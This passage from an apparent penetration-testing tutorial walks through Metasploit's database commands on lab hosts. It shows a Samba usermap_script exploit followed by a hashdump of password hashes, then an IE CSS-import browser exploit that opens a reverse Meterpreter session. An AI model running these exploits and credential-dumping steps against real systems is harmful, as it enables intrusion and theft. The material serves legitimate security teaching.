<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help workspace
</span><span class='line'>Usage:
</span><span class='line'>    workspace                  List workspaces
</span><span class='line'>    workspace [name]           Switch workspace
</span><span class='line'>    workspace -a [name] ...    Add workspace(s)
</span><span class='line'>    workspace -d [name] ...    Delete workspace(s)
</span><span class='line'>    workspace -D               Delete all workspaces
</span><span class='line'>    workspace -r &lt;old&gt; &lt;new&gt;   Rename workspace
</span><span class='line'>    workspace -h               Show this help information</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s say that you want a separate workspace for your lab target. You can add it and all the subsequent information will be saved in this workspace:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; workspace -a lab
</span><span class='line'>[*] Added workspace: lab
</span><span class='line'>msf &gt; workspace
</span><span class='line'>  default
</span><span class='line'>* lab</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s populate this workspace with some information about the target. I ran a <code>db_nmap</code> scan on the box and then I looked at the hosts data:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; hosts
</span><span class='line'>
</span><span class='line'>Hosts
</span><span class='line'>=====
</span><span class='line'>
</span><span class='line'>address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
</span><span class='line'>-------         ---                ----  -------  ---------  -----  -------  ----  --------
</span><span class='line'>192.168.80.156  00:0c:29:e5:3a:67        Linux               2.6.X  server         </span></code></pre></td></tr></table></div></figure>


<p>There is more that you can do with the <strong>hosts</strong> command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; hosts -h
</span><span class='line'>Usage: hosts [ options ] [addr1 addr2 ...]
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>  -a,--add          Add the hosts instead of searching
</span><span class='line'>  -d,--delete       Delete the hosts instead of searching
</span><span class='line'>  -c &lt;col1,col2&gt;    Only show the given columns (see list below)
</span><span class='line'>  -h,--help         Show this help information
</span><span class='line'>  -u,--up           Only show hosts which are up
</span><span class='line'>  -o &lt;file&gt;         Send output to a file in csv format
</span><span class='line'>  -R,--rhosts       Set RHOSTS from the results of the search
</span><span class='line'>  -S,--search       Search string to filter by
</span><span class='line'>  -i,--info         Change the info of a host
</span><span class='line'>  -n,--name         Change the name of a host
</span><span class='line'>  -m,--comment      Change the comment of a host
</span><span class='line'>  -t,--tag          Add or specify a tag to a range of hosts
</span><span class='line'>
</span><span class='line'>Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags</span></code></pre></td></tr></table></div></figure>


<p>With the <strong>services</strong> command, you can look at the identified services:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; services -h
</span><span class='line'>
</span><span class='line'>Usage: services [-h] [-u] [-a] [-r &lt;proto&gt;] [-p &lt;port1,port2&gt;] [-s &lt;name1,name2&gt;] [-o &lt;filename&gt;] [addr1 addr2 ...]
</span><span class='line'>
</span><span class='line'>  -a,--add          Add the services instead of searching
</span><span class='line'>  -d,--delete       Delete the services instead of searching
</span><span class='line'>  -c &lt;col1,col2&gt;    Only show the given columns
</span><span class='line'>  -h,--help         Show this help information
</span><span class='line'>  -s &lt;name1,name2&gt;  Search for a list of service names
</span><span class='line'>  -p &lt;port1,port2&gt;  Search for a list of ports
</span><span class='line'>  -r &lt;protocol&gt;     Only show [tcp|udp] services
</span><span class='line'>  -u,--up           Only show services which are up
</span><span class='line'>  -o &lt;file&gt;         Send output to a file in csv format
</span><span class='line'>  -R,--rhosts       Set RHOSTS from the results of the search
</span><span class='line'>  -S,--search       Search string to filter by
</span><span class='line'>
</span><span class='line'>Available columns: created_at, info, name, port, proto, state, updated_at
</span><span class='line'>
</span><span class='line'>msf &gt; services
</span><span class='line'>
</span><span class='line'>Services
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>host            port  proto  name         state  info
</span><span class='line'>----            ----  -----  ----         -----  ----
</span><span class='line'>192.168.80.156  21    tcp    ftp          open   ProFTPD 1.3.1
</span><span class='line'>192.168.80.156  22    tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0
</span><span class='line'>192.168.80.156  23    tcp    telnet       open   Linux telnetd
</span><span class='line'>192.168.80.156  25    tcp    smtp         open   Postfix smtpd
</span><span class='line'>192.168.80.156  53    tcp    domain       open   ISC BIND 9.4.2
</span><span class='line'>192.168.80.156  80    tcp    http         open   Apache httpd 2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
</span><span class='line'>192.168.80.156  139   tcp    netbios-ssn  open   Samba smbd 3.X workgroup: WORKGROUP
</span><span class='line'>192.168.80.156  445   tcp    netbios-ssn  open   Samba smbd 3.X workgroup: WORKGROUP
</span><span class='line'>192.168.80.156  3306  tcp    mysql        open   MySQL 5.0.51a-3ubuntu5
</span><span class='line'>192.168.80.156  5432  tcp    postgresql   open   PostgreSQL DB 8.3.0 - 8.3.7
</span><span class='line'>192.168.80.156  8009  tcp    ajp13        open   Apache Jserv Protocol v1.3
</span><span class='line'>192.168.80.156  8180  tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1</span></code></pre></td></tr></table></div></figure>


<p>You can also look at the vulnerabilities associated with different services:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help vulns
</span><span class='line'>Print all vulnerabilities in the database
</span><span class='line'>
</span><span class='line'>Usage: vulns [addr range]
</span><span class='line'>
</span><span class='line'>  -h,--help             Show this help information
</span><span class='line'>  -p,--port &lt;portspec&gt;  List vulns matching this port spec
</span><span class='line'>  -s &lt;svc names&gt;        List vulns matching these service names
</span><span class='line'>  -R,--rhosts           Set RHOSTS from the results of the search
</span><span class='line'>  -S,--search           Search string to filter by
</span><span class='line'>  -i,--info             Display Vuln Info
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  vulns -p 1-65536          # only vulns with associated services
</span><span class='line'>  vulns -p 1-65536 -s http  # identified as http on any port</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s possible to also add notes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help notes
</span><span class='line'>Usage: notes [-h] [-t &lt;type1,type2&gt;] [-n &lt;data string&gt;] [-a] [addr range]
</span><span class='line'>
</span><span class='line'>  -a,--add                  Add a note to the list of addresses, instead of listing
</span><span class='line'>  -d,--delete               Delete the hosts instead of searching
</span><span class='line'>  -n,--note &lt;data&gt;          Set the data for a new note (only with -a)
</span><span class='line'>  -t &lt;type1,type2&gt;          Search for a list of types
</span><span class='line'>  -h,--help                 Show this help information
</span><span class='line'>  -R,--rhosts               Set RHOSTS from the results of the search
</span><span class='line'>  -S,--search               Regular expression to match for search
</span><span class='line'>  -o,--output               Save the notes to a csv file
</span><span class='line'>  --sort &lt;field1,field2&gt;    Fields to sort by (case sensitive)
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  notes --add -t apps -n 'winzip' 10.1.1.34 10.1.20.41
</span><span class='line'>  notes -t smb.fingerprint 10.1.1.34 10.1.20.41
</span><span class='line'>  notes -S 'nmap.nse.(http|rtsp)' --sort type,output</span></code></pre></td></tr></table></div></figure>


<p>If credentials were found, we have a way to list and manage them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help creds
</span><span class='line'>
</span><span class='line'>With no sub-command, list credentials. If an address range is
</span><span class='line'>given, show only credentials with logins on hosts within that
</span><span class='line'>range.
</span><span class='line'>
</span><span class='line'>Usage - Listing credentials:
</span><span class='line'>  creds [filter options] [address range]
</span><span class='line'>
</span><span class='line'>Usage - Adding credentials:
</span><span class='line'>  creds add-ntlm &lt;user&gt; &lt;ntlm hash&gt; [domain]
</span><span class='line'>  creds add-password &lt;user&gt; &lt;password&gt; [realm] [realm-type]
</span><span class='line'>  creds add-ssh-key &lt;user&gt; &lt;/path/to/id_rsa&gt; [realm-type]
</span><span class='line'>Where [realm type] can be one of:
</span><span class='line'>  domain - Active Directory Domain
</span><span class='line'>  db2db - DB2 Database
</span><span class='line'>  sid - Oracle System Identifier
</span><span class='line'>  pgdb - PostgreSQL Database
</span><span class='line'>  wildcard - *
</span><span class='line'>
</span><span class='line'>General options
</span><span class='line'>  -h,--help             Show this help information
</span><span class='line'>  -o &lt;file&gt;             Send output to a file in csv format
</span><span class='line'>  -d                    Delete one or more credentials
</span><span class='line'>
</span><span class='line'>Filter options for listing
</span><span class='line'>  -P,--password &lt;regex&gt; List passwords that match this regex
</span><span class='line'>  -p,--port &lt;portspec&gt;  List creds with logins on services matching this port spec
</span><span class='line'>  -s &lt;svc names&gt;        List creds matching comma-separated service names
</span><span class='line'>  -u,--user &lt;regex&gt;     List users that match this regex
</span><span class='line'>  -t,--type &lt;type&gt;      List creds that match the following types: password,ntlm,hash
</span><span class='line'>  -O,--origins          List creds that match these origins
</span><span class='line'>  -R,--rhosts           Set RHOSTS from the results of the search
</span><span class='line'>
</span><span class='line'>Examples, listing:
</span><span class='line'>  creds               # Default, returns all credentials
</span><span class='line'>  creds 1.2.3.4/24    # nmap host specification
</span><span class='line'>  creds -p 22-25,445  # nmap port specification
</span><span class='line'>  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services
</span><span class='line'>  creds -t ntlm       # All NTLM creds
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Examples, adding:
</span><span class='line'>  # Add a user with an NTLMHash
</span><span class='line'>  creds add-ntlm alice 5cfe4c82d9ab8c66590f5b47cd6690f1:978a2e2e1dec9804c6b936f254727f9a
</span><span class='line'>  # Add a user with a blank password and a domain
</span><span class='line'>  creds add-password bob '' contosso
</span><span class='line'>  # Add a user with an SSH key
</span><span class='line'>  creds add-ssh-key root /root/.ssh/id_rsa
</span><span class='line'>
</span><span class='line'>Example, deleting:
</span><span class='line'>  # Delete all SMB credentials
</span><span class='line'>  creds -d -s smb</span></code></pre></td></tr></table></div></figure>


<p>As you can see though, I have no credentials in the database:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; creds
</span><span class='line'>Credentials
</span><span class='line'>===========
</span><span class='line'>
</span><span class='line'>host  origin  service  public  private  realm  private_type
</span><span class='line'>----  ------  -------  ------  -------  -----  ------------</span></code></pre></td></tr></table></div></figure>


<p>Finally, there is the loot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help loot
</span><span class='line'>Usage: loot &lt;options&gt;
</span><span class='line'> Info: loot [-h] [addr1 addr2 ...] [-t &lt;type1,type2&gt;]
</span><span class='line'>  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] [-t [type]
</span><span class='line'>  Del: loot -d [addr1 addr2 ...]
</span><span class='line'>
</span><span class='line'>  -a,--add          Add loot to the list of addresses, instead of listing
</span><span class='line'>  -d,--delete       Delete *all* loot matching host and type
</span><span class='line'>  -f,--file         File with contents of the loot to add
</span><span class='line'>  -i,--info         Info of the loot to add
</span><span class='line'>  -t &lt;type1,type2&gt;  Search for a list of types
</span><span class='line'>  -h,--help         Show this help information
</span><span class='line'>  -S,--search       Search string to filter by</span></code></pre></td></tr></table></div></figure>


<p>I have compromised the target via the Samba service and now I will loot some hashes from it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; run -j
</span><span class='line'>[*] Exploit running as background job.
</span><span class='line'>
</span><span class='line'>[*] Started bind handler
</span><span class='line'>msf exploit(usermap_script) &gt; [*] Command shell session 2 opened (192.168.80.155:49009 -&gt; 192.168.80.156:4444) at 2016-06-03 13:19:48 -0400
</span><span class='line'>
</span><span class='line'>msf exploit(usermap_script) &gt; use post/linux/gather/hashdump
</span><span class='line'>msf post(hashdump) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (post/linux/gather/hashdump):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   SESSION                   yes       The session to run this module on.
</span><span class='line'>
</span><span class='line'>msf post(hashdump) &gt; sessions
</span><span class='line'>
</span><span class='line'>Active sessions
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>  Id  Type        Information  Connection
</span><span class='line'>  --  ----        -----------  ----------
</span><span class='line'>  2   shell unix               192.168.80.155:49009 -&gt; 192.168.80.156:4444 (192.168.80.156)
</span><span class='line'>
</span><span class='line'>msf post(hashdump) &gt; set SESSION 2
</span><span class='line'>SESSION =&gt; 2
</span><span class='line'>msf post(hashdump) &gt; run
</span><span class='line'>
</span><span class='line'>[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
</span><span class='line'>[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
</span><span class='line'>[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
</span><span class='line'>[+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
</span><span class='line'>[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
</span><span class='line'>[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
</span><span class='line'>[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
</span><span class='line'>[+] Unshadowed Password File: /root/.msf5/loot/20160603132136_lab_192.168.80.156_linux.hashes_520578.txt
</span><span class='line'>[*] Post module execution completed</span></code></pre></td></tr></table></div></figure>


<p>Now I can see the loot in the database:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf post(hashdump) &gt; loot
</span><span class='line'>
</span><span class='line'>Loot
</span><span class='line'>====
</span><span class='line'>
</span><span class='line'>host            service  type          name                   content     info                            path
</span><span class='line'>----            -------  ----          ----                   -------     ----                            ----
</span><span class='line'>192.168.80.156           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf5/loot/20160603132136_lab_192.168.80.156_linux.hashes_520578.txt
</span><span class='line'>192.168.80.156           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf5/loot/20160603132135_lab_192.168.80.156_linux.passwd_153460.txt
</span><span class='line'>192.168.80.156           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf5/loot/20160603132135_lab_192.168.80.156_linux.shadow_842643.txt</span></code></pre></td></tr></table></div></figure>


<h1>Meterpreter</h1>

<p>Next, let&rsquo;s look at Meterpreter, the king of payloads. Meterpreter has no disk presence because it only exists in memory, and it leaves no trail behind of created processes because it injects itself in currently running processes. To top it off, its traffic is encrypted. I will show Meterpreter in action here, but this time, the target is a Windows 7 machine.</p>

<p>I&rsquo;ve already set up the exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (exploit/windows/browser/ms11_003_ie_css_import):
</span><span class='line'>
</span><span class='line'>   Name       Current Setting  Required  Description
</span><span class='line'>   ----       ---------------  --------  -----------
</span><span class='line'>   OBFUSCATE  true             no        Enable JavaScript obfuscation
</span><span class='line'>   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
</span><span class='line'>   SRVPORT    8080             yes       The local port to listen on.
</span><span class='line'>   SSL        false            no        Negotiate SSL for incoming connections
</span><span class='line'>   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
</span><span class='line'>   URIPATH                     no        The URI to use for this exploit (default is random)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (windows/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>   LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>   LPORT     4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic</span></code></pre></td></tr></table></div></figure>


<p>And the description of what this exploit does:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Description:
</span><span class='line'>  This module exploits a memory corruption vulnerability within 
</span><span class='line'>  Microsoft\'s HTML engine (mshtml). When parsing an HTML page 
</span><span class='line'>  containing a recursive CSS import, a C++ object is deleted and later 
</span><span class='line'>  reused. This leads to arbitrary code execution. This exploit 
</span><span class='line'>  utilizes a combination of heap spraying and the .NET 2.0 
</span><span class='line'>  'mscorie.dll' module to bypass DEP and ASLR. This module does not 
</span><span class='line'>  opt-in to ASLR. As such, this module should be reliable on all 
</span><span class='line'>  Windows versions with .NET 2.0.50727 installed.</span></code></pre></td></tr></table></div></figure>


<p>All right, first I start the handler on my attacking machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; run -j
</span><span class='line'>[*] Exploit running as background job.
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.80.155:4444 
</span><span class='line'>[*] Using URL: http://0.0.0.0:8080/Br8CNFRY
</span><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; [*] Local IP: http://192.168.80.155:8080/Br8CNFRY
</span><span class='line'>[*] Server started.</span></code></pre></td></tr></table></div></figure>


<p>Then on the victim, I disabled WIndows Firewall and then I used Internet Explorer (ugh) to go to the URL <code><a href="http://192.168.80.155:8080/Br8CNFRY">http://192.168.80.155:8080/Br8CNFRY</a></code>. And on my Kali machine, a Meterpreter session was opened:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; [*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY"
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Sending redirect
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/RHHy0H.html"
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Sending HTML
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/generic-1465040907.dll"
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Sending .NET DLL
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Received request for "/Br8CNFRY/\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A\xEE\x80\xA0\xE1\x81\x9A"
</span><span class='line'>[*] 192.168.80.128   ms11_003_ie_css_import - Sending CSS
</span><span class='line'>[*] Sending stage (957487 bytes) to 192.168.80.128
</span><span class='line'>[*] Meterpreter session 5 opened (192.168.80.155:4444 -&gt; 192.168.80.128:49281) at 2016-06-04 07:48:33 -0400
</span><span class='line'>[*] Session ID 5 (192.168.80.155:4444 -&gt; 192.168.80.128:49281) processing InitialAutoRunScript 'migrate -f'
</span><span class='line'>[*] Current server process: iexplore.exe (2772)
</span><span class='line'>[*] Spawning notepad.exe process to migrate to
</span><span class='line'>[+] Migrating to 988
</span><span class='line'>[+] Successfully migrated to process </span></code></pre></td></tr></table></div></figure>


<p>I actually closed IE on the Windows machine because it kept requesting the DLL and opening more sessions. Now it&rsquo;s time to go to the newly created Meterpreter session:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; sessions
</span><span class='line'>
</span><span class='line'>Active sessions
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>  Id  Type                   Information                                Connection
